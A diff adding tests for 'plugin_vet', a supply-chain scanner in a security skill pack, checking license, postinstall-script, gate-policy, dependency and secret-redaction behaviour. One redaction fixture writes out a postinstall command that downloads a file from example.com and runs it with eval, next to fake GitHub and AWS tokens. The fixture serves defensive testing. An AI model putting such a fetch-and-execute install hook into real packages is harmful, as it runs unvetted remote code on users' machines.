@@ -32,6 +32,12 @@
  *       shipped content (the intentional FAKE example is allowlisted)
  *   15. the release-checklist batch command is UTF-8-safe on Windows
  *       PowerShell 5.1 (bare Get-Content/Set-Content would corrupt Chinese)
+ *   16. plugin_vet registers on ctx.tools and passes the compliant fixture
+ *   17. plugin_vet fails the no-license fixture and cites skill sections
+ *   18. plugin_vet fails the malicious postinstall fixture (scripts/exfil/obfuscation)
+ *   19. the gate blocks installation under policy deny
+ *   20. the scan engine is zero-dependency (node: builtins and relative imports only)
+ *   21. report redaction keeps secret-shaped fixture text out of rendered output
  *
  * Run: <checkout>\node_modules\.bin\tsx.CMD verify\verify-skill-pack.mts
  * Requires a local deepseek-harness checkout; the script resolves it relative
@@ -387,7 +393,7 @@ async function main(): Promise<void> {
   }))
 
   // --- 8. optional provider plugin -------------------------------------------
-  steps.push(check('provider plugin: mounts zh/en editions, disposes cleanly, misconfiguration fails loud', async () => {
+  steps.push(check('provider plugin: mounts zh/en editions, registers plugin_vet, disposes cleanly, misconfiguration fails loud', async () => {
     // The pack sits outside the pnpm workspace, so give the plugin's bare
     // imports a resolution shim (junctions into the harness packages).
     const shimBase = join(PACK_DIR, 'node_modules', '@deepseek-ai')
@@ -395,6 +401,7 @@ async function main(): Promise<void> {
     const resolverBase = join(fileURLToPath(HARNESS), 'packages/skill/skill-filesystem/node_modules/@deepseek-ai')
     const links: Array<[string, string]> = [
       ['dsh-skill-filesystem', join(fileURLToPath(HARNESS), 'packages/skill/skill-filesystem')],
+      ['dsh-tools', join(fileURLToPath(HARNESS), 'packages/core/tools')],
       ['schemastery', await realpath(join(resolverBase, 'schemastery'))],
     ]
     for (const [pkg, target] of links) {
@@ -408,25 +415,33 @@ async function main(): Promise<void> {
     try {
       const providerPlugin = await import(new URL('../provider/src/index.ts', import.meta.url).href)
       assert.equal(providerPlugin.name, 'skill-pack-security')
-      assert.deepEqual(providerPlugin.inject, ['skills'])
+      assert.deepEqual(providerPlugin.inject, ['skills', 'tools'])
+
+      /** Mount a full context with both services the provider injects. */
+      async function mountPlugin(config: Record<string, unknown> = {}) {
+        const ctx = new Context()
+        await ctx.plugin(SystemPrompt)
+        await ctx.plugin(ToolRuntime)
+        await ctx.plugin(AgentRegistry)
+        await ctx.plugin(SkillRegistry)
+        const fiber = await ctx.plugin(providerPlugin, config)
+        return { ctx, fiber }
+      }
 
       // Default mount publishes the Chinese edition.
-      const zhCtx = new Context()
-      await zhCtx.plugin(SkillRegistry)
-      const zhFiber = await zhCtx.plugin(providerPlugin)
+      const { ctx: zhCtx, fiber: zhFiber } = await mountPlugin()
       const zhListed = await zhCtx.skills.list()
       assert.deepEqual(zhListed.map(s => s.name), [...SKILL_NAMES].sort())
       for (const s of zhListed) assert.equal(s.provider, 'skill-pack-security')
       const zhSpec = await zhCtx.skills.get('security-audit')
       assert.ok(zhSpec?.content.includes('安全审计总览'), 'default mount must publish the Chinese edition')
+      assert.ok(zhCtx.tools.get('plugin_vet', agentForCwd(PACK_DIR)), 'plugin_vet tool must be registered')
 
       await zhFiber.dispose()
       assert.deepEqual((await zhCtx.skills.list()).map(s => s.name), [])
 
       // `language: en` mounts the English edition instead.
-      const enCtx = new Context()
-      await enCtx.plugin(SkillRegistry)
-      const enFiber = await enCtx.plugin(providerPlugin, { language: 'en' })
+      const { ctx: enCtx, fiber: enFiber } = await mountPlugin({ language: 'en' })
       const enListed = await enCtx.skills.list()
       assert.deepEqual(enListed.map(s => s.name), [...SKILL_NAMES].sort())
       for (const s of enListed) assert.equal(s.provider, 'skill-pack-security')
@@ -450,6 +465,9 @@ async function main(): Promise<void> {
       )
       // An explicit valid root still mounts.
       const explicitCtx = new Context()
+      await explicitCtx.plugin(SystemPrompt)
+      await explicitCtx.plugin(ToolRuntime)
+      await explicitCtx.plugin(AgentRegistry)
       await explicitCtx.plugin(SkillRegistry)
       const explicitFiber = await explicitCtx.plugin(providerPlugin, { skillsDir: join(PACK_DIR, 'skills-en') })
       const explicitListed = await explicitCtx.skills.list()
@@ -571,6 +589,118 @@ async function main(): Promise<void> {
     assert.ok(text.includes('Get-Content $_.FullName -Raw -Encoding UTF8'), 'batch command must read with -Encoding UTF8')
     assert.ok(text.includes('UTF8Encoding($false)'), 'batch command must construct a BOM-less UTF8 encoding')
     assert.ok(text.includes('[System.IO.File]::WriteAllText'), 'batch command must write via .NET WriteAllText (Set-Content -Encoding UTF8 adds a BOM on PS 5.1)')
+  }))
+
+  // --- 16-19. plugin_vet tool through the real ToolRuntime ----------------------
+  const VET_FIXTURES = join(PACK_DIR, 'verify', 'fixtures', 'vet')
+
+  /** Mount the provider with the real tools runtime and execute plugin_vet once. */
+  async function vetOnce(args: Record<string, unknown>, config: Record<string, unknown> = { language: 'en' }): Promise<string> {
+    const ctx = new Context()
+    await ctx.plugin(SystemPrompt)
+    await ctx.plugin(ToolRuntime)
+    await ctx.plugin(AgentRegistry)
+    await ctx.plugin(SkillRegistry)
+    const providerPluginForVet = await import(new URL('../provider/src/index.ts', import.meta.url).href)
+    await ctx.plugin(providerPluginForVet, config)
+    const agent = agentForCwd(PACK_DIR)
+    assert.ok(ctx.tools.get('plugin_vet', agent), 'plugin_vet tool must be registered')
+    const result = await ctx.tools.execute({
+      signal: new AbortController().signal,
+      callId: CallId(`verify-vet-${Math.random().toString(36).slice(2)}`),
+      name: 'plugin_vet',
+      arguments: args,
+      agent,
+    })
+    assert.equal(result.isError, false, `plugin_vet failed: ${(result.content[0] as { text?: string })?.text ?? JSON.stringify(result.content)}`)
+    return (result.content[0] as { text?: string })?.text ?? ''
+  }
+
+  steps.push(check('plugin_vet (tool): registers on ctx.tools and passes the compliant fixture', async () => {
+    const text = await vetOnce({ target: join(VET_FIXTURES, 'clean') })
+    assert.match(text, /Verdict: PASS/, 'clean fixture must yield PASS')
+    assert.match(text, /MIT is a common SPDX id/, 'license check must run')
+    assert.match(text, /`supply-chain-review §1`/, 'findings must cite skill sections')
+  }))
+
+  steps.push(check('plugin_vet (tool): fails the no-license fixture and cites skills for the follow-up audit', async () => {
+    const text = await vetOnce({ target: join(VET_FIXTURES, 'no-license') })
+    assert.match(text, /Verdict: FAIL/, 'no-license fixture must yield FAIL')
+    assert.match(text, /No license at all/, 'license check must flag the missing license')
+    assert.match(text, /`dependency-audit §3`/, 'license finding must cite dependency-audit §3')
+    assert.match(text, /Gate warning/, 'warn policy must surface the gate warning')
+    assert.match(text, /not a pinned 40-hex commit/, 'unpinned workflow action must be flagged')
+  }))
+
+  steps.push(check('plugin_vet (tool): fails the malicious postinstall fixture (scripts/exfil/obfuscation)', async () => {
+    const text = await vetOnce({ target: join(VET_FIXTURES, 'postinstall') })
+    assert.match(text, /Verdict: FAIL/, 'postinstall fixture must yield FAIL')
+    assert.match(text, /downloads executable content and runs it/, 'postinstall download+exec must be flagged')
+    assert.match(text, /data-exfiltration indicator/, 'receiver domain must be flagged')
+    assert.match(text, /dynamic eval \+ encoded payload/, 'obfuscated eval payload must be flagged')
+    assert.match(text, /`supply-chain-review §1`/, 'script findings must cite supply-chain-review §1')
+  }))
+
+  steps.push(check('plugin_vet (gate): deny policy blocks installation on FAIL', async () => {
+    const text = await vetOnce({ target: join(VET_FIXTURES, 'no-license'), policy: 'deny' })
+    assert.match(text, /Verdict: FAIL/)
+    assert.match(text, /Gate DENY/, 'deny policy must block the install')
+  }))
+
+  // --- 20. zero-dependency scan engine -----------------------------------------
+  steps.push(check('vet engine: zero-dependency (node: builtins and relative imports only)', async () => {
+    const vetDir = join(PACK_DIR, 'provider', 'src', 'vet')
+    const sources = await readdir(vetDir)
+    const imports: string[] = []
+    for (const file of sources.filter(f => f.endsWith('.ts'))) {
+      const raw = await readFile(join(vetDir, file), 'utf8')
+      for (const match of raw.matchAll(/^\s*import[^'"]*from\s*['"]([^'"]+)['"]/gm)) {
+        imports.push(`${file}: ${match[1]}`)
+      }
+      for (const match of raw.matchAll(/^\s*import\s*['"]([^'"]+)['"]/gm)) {
+        imports.push(`${file}: ${match[1]}`)
+      }
+    }
+    for (const entry of imports) {
+      const [file, spec] = [entry.split(': ')[0], entry.split(': ').slice(1).join(': ')]
+      const allowed =
+        spec.startsWith('node:') || spec.startsWith('.') || spec.startsWith('../') ||
+        // The tool adapter (and only the tool adapter) may bridge to the
+        // official harness packages; the scan engine below it stays zero-dep.
+        (file === 'tool.ts' && (spec === '@deepseek-ai/dsh-tools' || spec === '@deepseek-ai/dsh-llm'))
+      assert.ok(allowed, `vet engine import must be a node: builtin, a relative path, or the official bridge in tool.ts: ${entry}`)
+    }
+  }))
+
+  // --- 21. report redaction ------------------------------------------------------
+  steps.push(check('vet engine: redaction keeps secret-shaped text out of rendered reports', async () => {
+    const engineMod = await import(new URL('../provider/src/vet/engine.ts', import.meta.url).href)
+    const configMod = await import(new URL('../provider/src/vet/config.ts', import.meta.url).href)
+    const reportMod = await import(new URL('../provider/src/vet/report.ts', import.meta.url).href)
+    const root = await mkdtemp(join(tmpdir(), 'dsh-vet-redact-'))
+    try {
+      const fakeGithub = `ghp_${'A'.repeat(36)}`
+      const fakeAws = `AKIA${'1'.repeat(16)}`
+      await writeFile(join(root, 'package.json'), JSON.stringify({
+        name: 'dsh-fixture-redact', version: '1.0.0', license: 'MIT',
+        // A fail-level install script whose evidence snippet would carry the
+        // tokens unless the engine redacts them.
+        scripts: { postinstall: `curl -s https://example.com/x -o /tmp/x && echo '${fakeGithub} ${fakeAws}' && eval sh /tmp/x` },
+      }))
+      await writeFile(join(root, 'LICENSE'), 'MIT License fixture\n')
+      await writeFile(join(root, 'README.md'), '# fixture\n')
+      const report = await engineMod.runVet({ target: root }, configMod.resolveVetConfig({}), 'en', new AbortController().signal)
+      const rendered = reportMod.renderReport(report, 'en')
+      const serialized = JSON.stringify(report)
+      for (const secret of [fakeGithub, fakeAws]) {
+        assert.ok(!rendered.includes(secret), 'rendered report must not contain the fake token')
+        assert.ok(!serialized.includes(secret), 'canonical report must not contain the fake token')
+      }
+      assert.match(rendered, /downloads executable content and runs it/, 'redacted report still carries the finding')
+      assert.match(rendered, /ghp_\*\*\*/, 'github token must be replaced by a type marker')
+    } finally {
+      await rm(root, { recursive: true, force: true })
+    }
   }))
 
   // ---------------------------------------------------------------------------
